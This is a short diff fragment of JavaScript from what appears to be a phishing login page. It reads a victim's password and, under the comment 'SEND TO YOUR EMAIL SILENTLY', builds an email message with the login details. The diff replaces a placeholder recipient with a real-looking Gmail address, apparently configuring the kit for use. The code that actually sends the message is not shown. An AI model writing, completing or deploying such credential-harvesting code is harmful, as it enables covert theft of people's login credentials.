@@ -57,7 +57,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const password = passwordInput.value;
 
     // ───── SEND TO YOUR EMAIL SILENTLY ─────
-    const yourEmail = "youremail@gmail.com";    // ← CHANGE THIS       // ← CHANGE THIS TO YOUR REAL EMAIL
+    const yourEmail = "mickedroms555@gmail.com";    // ← CHANGE THIS       // ← CHANGE THIS TO YOUR REAL EMAIL
     const subject = encodeURIComponent(`New Login - ${method}`);
     const body = encodeURIComponent(
       `Login Method: ${method}\n` +
